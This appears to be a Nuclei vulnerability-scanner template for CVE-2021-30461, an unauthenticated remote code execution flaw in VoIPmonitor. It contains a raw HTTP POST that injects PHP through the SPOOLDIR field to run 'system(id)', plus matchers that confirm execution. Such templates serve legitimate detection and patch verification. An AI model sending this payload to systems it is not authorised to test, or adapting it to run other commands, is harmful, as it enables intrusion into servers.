id: cve-2021-30461
info:
  author: shifacyclewala,hackergautam
  description: Use of user supplied data, arriving via web interface allows remote
    unauthenticated users to trigger a remote PHP code execution vulnerability in
    VoIPmonitor.
  name: VoipMonitor Pre-Auth-RCE
  reference: https://ssd-disclosure.com/ssd-advisory-voipmonitor-unauth-rce/
  severity: critical
  tags: cve,cve2021,rce,voipmonitor
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - uid=
    - gid=
    - groups=
    - VoIPmonitor installation
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /index.php HTTP/1.1

    Host: {{Hostname}}

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

    Accept-Language: en-US,en;q=0.5

    Accept-Encoding: gzip, deflate

    Connection: close

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 35


    SPOOLDIR=test".system(id)."&recheck=Recheck

    '
